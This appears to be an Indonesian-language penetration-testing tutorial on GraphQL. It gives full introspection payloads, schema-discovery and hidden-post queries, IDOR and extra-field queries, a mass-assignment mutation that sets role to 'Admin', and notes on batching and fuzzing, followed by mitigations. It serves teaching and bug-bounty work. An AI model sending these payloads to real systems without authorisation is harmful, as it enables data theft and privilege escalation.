# GraphQL introspection

## jika fitur ini diaktifkan
Selama pengujian penetrasi, kita dapat menggunakan payload di bawah ini untuk melakukan introspeksi GraphQL (jika fitur ini diaktifkan) pada target kita:

```js

{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

```json
{"query":
"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"
}

```
Hasl dari Gemini
```js
{
  "query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }"
}
```

Hasil Lain
```js
{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}

```


## Introspection Query Payload


**Untuk Menemukn Skema**
```json
{"query":
"{__schema{types{name,fields{name}}}}"}
```

**Untuk Mendaptkan informasi dari skema yagn di dapatkan**
Disni kita mendaktan inforamsi kalau ada `getBlogPost` dan `getBlogPost`
Diman disni untuk blogpost degna id 3 itu tidka ad dan mungkin sudah di hapus
Di sini kita melihat nama: “Blog Posts” dan kita melihat semua field di dalamnya, dan field postPassword memang berada di dalam Blog Posts. Saat kita melakukan enumerasi aplikasi web di awal, kita melihat ada semua id BlogPosts kecuali id ​​yang sama dengan 3. Jadi itulah postingan target kita!


```json
{"query":
"{getBlogPost(id:3){getBlogPost}}"}
```


## GraphQL introspection disabled? Coba serangan fuzzing sebagai gantinya.

GraphQL’s introspectionterkadang dinonaktifkan untuk pengguna yang tidak berwenang sebagai langkah keamanan. Namun, fitur saran field GraphQL, yang diaktifkan secara default, juga dapat secara tidak sengaja mengungkapkan informasi skema. Fitur ini membantu pengembang dengan menyarankan koreksi untuk field yang salah ketik, jadi jika Anda melakukan query pada suatu field dan menyertakan kesalahan ketik yang disengaja, GraphQL akan menyarankan field yang sangat sesuai dengan query yang Anda maksudkan – secara tidak sengaja mempermudah upaya rekonsiliasi Anda.

> Catatan: Penyalahgunaan saran field ini secara teknis tidak termasuk dalam potensi kerentanan, karena perilaku ini memang disengaja. Namun demikian, bagi peretas, fitur ini merupakan cara yang sangat berharga untuk mendapatkan wawasan tentang skema GraphQL – terutama ketika fitur introspeksi tidak dapat diakses.

Sebaiknya gunakan alat khusus daripada melakukan serangan fuzzing ini secara manual. Burp Suite Intruder adalah pilihan populer, meskipun membutuhkan konfigurasi yang cukup untuk mencapai hasil yang akurat untuk jenis serangan ini. Oleh karena itu, ada baiknya juga mencoba alat komunitas yang dibuat khusus seperti **Clairvoyance** dan **GraphQLmap** .


## GraphQL query vulnerabilities

Tantangan mendasar pada GraphQL adalah kurangnya sistem kontrol akses bawaan. Sebagai gantinya, pengembang harus menulis resolver khusus untuk memetakan kueri ke basis data yang sesuai, yang dapat menimbulkan kerentanan seperti kontrol akses yang tidak tepat dan kelemahan Insecure Direct Object Reference (IDOR) jika tidak dilakukan dengan benar.

Sebagai contoh, pertimbangkan kueri yang sah bernama "currentUser" yang menerima parameter "internalId". Kueri ini seharusnya hanya mengembalikan informasi untuk pengguna yang saat ini terhubung, yang diidentifikasi oleh internalId, sehingga menjaga keamanan data pengguna lain:

```js
query {
  currentUser(internalId: 1337) {
    role
    name
    email
    token
  }
}
```


Mengubah pengaturan tersebut `internalId` dapat mengambil data pengguna lain, yang mengindikasikan adanya IDOR – kerentanan GraphQL umum yang terjadi ketika kontrol akses tidak diterapkan dengan benar.

Demikian pula, kueri dapat dimanipulasi untuk mengekstrak data yang tidak diinginkan. Misalnya, perhatikan kueri berikut, yang digunakan oleh aplikasi web buletin:

```js
query {
  listPosts(postId: 13) {
    title
    description
  }
}
```

Jika penyerang menambahkan bidang tambahan ke kueri ini, mereka mungkin dapat mengekstrak informasi sensitif. Skenario ini menggarisbawahi pentingnya menerapkan validasi dan kontrol akses yang ketat pada resolver GraphQL. Dengan menggunakan introspeksi atau fuzzing, Anda mungkin juga menemukan objek tambahan seperti "user" dan karenanya mengambil informasi sensitif tambahan:

```js
query {
  listPosts(postId: 13) {
    title
    description
  }
user {
    username
    email
    firstName
    lastName
    }
}
```

## GraphQL mutation vulnerabilities

Sedangkan query digunakan untuk mengambil data, mutasi dalam konteks GraphQL digunakan untuk memodifikasi data – yang menimbulkan risiko kerentanan seperti kesalahan penugasan massal.

Perhatikan sebuah mutasi bernama “ **registerAccount** ”, yang digunakan untuk membuat akun pengguna. Mutasi ini menerima field seperti `nickname`, `email` dan `password`. Selain itu, respons GraphQL untuk mutasi ini menyertakan `role` field di dalam objek yang dikembalikan `user`:

```js
mutation {
    registerAccount(nickname:"hacker", email:"hacktheplanet@yeswehack.ninja", password:"StrongP@ssword!") {
        token {
             accessToken
        }
        user {
           email
           nickname
           role
           } 
       }
    }
}
```

Untuk menguji kerentanan penugasan massal, mari kita tambahkan `role` field tersebut langsung ke dalam permintaan mutasi untuk melihat apakah aplikasi menerima dan menerapkannya secara tidak benar:


```js
mutation {
    registerAccount(nickname:"hacker", email:"hacktheplanet@yeswehack.ninja", password:"StrongP@ssword!", role:"Admin") {
        token {
             accessToken
        }
        user {
           email
           nickname
           role
           } 
       }
    }
}
```

Seperti yang disebutkan sebelumnya, bagian tersulit dari GraphQL bagi pengembang adalah menerapkan kontrol akses per permintaan yang terperinci dan mengimplementasikan resolver yang terintegrasi dengan mulus dengan kontrol tersebut.

## Melakukan serangan batching di GraphQL

**[Batching](https://www.apollographql.com/blog/batching-client-graphql-queries)** melibatkan penggabungan beberapa permintaan menjadi satu permintaan tunggal. Mirip dengan melakukan serangan brute-force tetapi dengan satu permintaan tunggal, serangan batching dapat melewati otentikasi dan pembatasan laju dengan secara bersamaan menjalankan beberapa pengujian kredensial atau kueri.

Jika Anda ingin mengetahui lebih lanjut tentang serangan batching, saya mengundang Anda untuk membaca [artikel yang sangat bagus ini](http://web.archive.org/web/20220516130039/https://lab.wallarm.com/graphql-batching-attack/) .


## Alat GraphQL penting

Alat bantu pengujian secara signifikan menyederhanakan pengujian GraphQL dengan memvisualisasikan skema dan mengotomatiskan tugas-tugas umum. Berikut adalah dua alat yang sangat berguna untuk menguji GraphQL secara lebih efisien:

### GraphQL Voyager

Struktur skema GraphQL bisa sangat sulit dipahami karena biasanya melibatkan banyak data. Dengan memvisualisasikan komposisi objek, mutasi, dan kueri melalui antarmuka pengguna yang ramah, [GraphQL Voyager](https://graphql-kit.com/graphql-voyager) menyederhanakan proses pemahaman struktur skema GraphQL.

### InQL (ekstensi Burp Suite)

**[InQL](https://github.com/doyensec/inql)** memungkinkan Anda untuk melakukan kueri introspeksi dan menghasilkan templat kueri berdasarkan skema yang ditemukan. Ia juga memiliki beberapa metode untuk penemuan skema yang berguna untuk dimanfaatkan ketika introspeksi dinonaktifkan. InQL tersedia sebagai antarmuka baris perintah (CLI) atau ekstensi Burp Suite.


## Mitigasi & praktik terbaik untuk keamanan GraphQL

Berikut beberapa langkah yang direkomendasikan untuk mengkonfigurasi GraphQL dengan lebih aman guna mencegah jenis serangan yang telah kami uraikan:

- **Nonaktifkan introspeksi di lingkungan produksi :** Menonaktifkan introspeksi atau membatasi akses hanya untuk pengguna yang berwenang mencegah penyerang memetakan skema API Anda dan membocorkan informasi sensitif.
- **Terapkan kontrol akses yang ketat:** Pemeriksaan otorisasi yang ketat pada setiap resolver membantu mencegah pengguna yang tidak berwenang mengakses atau memodifikasi data.
- **Gunakan daftar putih kueri:** Izinkan eksekusi hanya kueri yang telah disetujui sebelumnya dengan mempertahankan daftar putih kueri yang aman. Ini mengurangi risiko kueri sembarangan atau berbahaya yang memengaruhi sistem Anda.
- **Penanganan kesalahan yang aman:** Pesan kesalahan berpotensi mengungkap informasi sensitif tentang API atau sistem yang mendasarinya. Gunakan respons kesalahan generik untuk pengguna akhir, sementara detail lengkap dicatat secara internal untuk tujuan debugging.

Menerapkan praktik-praktik ini secara signifikan meningkatkan keamanan GraphQL, sehingga memastikan lingkungan yang lebih aman dan tangguh bagi aplikasi Anda dan para penggunanya.

## Kesimpulan

Fleksibilitas GraphQL sangat membantu para pengembang, tetapi juga menghadirkan tantangan keamanan yang unik.

Meskipun para pengembang memiliki pendapat yang berbeda mengenai **kekuatan dan kelemahan keamanan relatif** GraphQL dibandingkan dengan API REST, jelas bahwa GraphQL menawarkan celah keamanan yang menarik untuk dieksplorasi oleh peretas etis.

Selain itu, fleksibilitas GraphQL dan penggunaannya dalam aplikasi paling populer di dunia (termasuk X, Shopify, dan Facebook, misalnya) berarti pembayaran Bug Bounty untuk kerentanan GraphQL terkadang bisa sangat besar.

Teknik-teknik yang telah kita bahas untuk mengeksploitasi endpoint GraphQL – memanfaatkan introspeksi, kueri, mutasi, dan pengelompokan – akan menjadi bagian yang sangat berharga dari perlengkapan Anda sebagai seorang pentester atau pemburu bug.

Mengingat potensi keuntungannya, ada baiknya melanjutkan pendidikan GraphQL Anda di luar membaca artikel ini. Misalnya, ada baiknya membaca artikel " Looting GraphQL Endpoints for Fun and Profit" oleh Raz0r, dan menonton presentasi "GraphQL is the New PHP" oleh 0xlupin di NahamCon 2024 dan "How to Hack GraphQL" oleh Nick Aleks di GraphQL Wroclaw Meetup (serta merujuk pada referensi lain yang tercantum di bawah).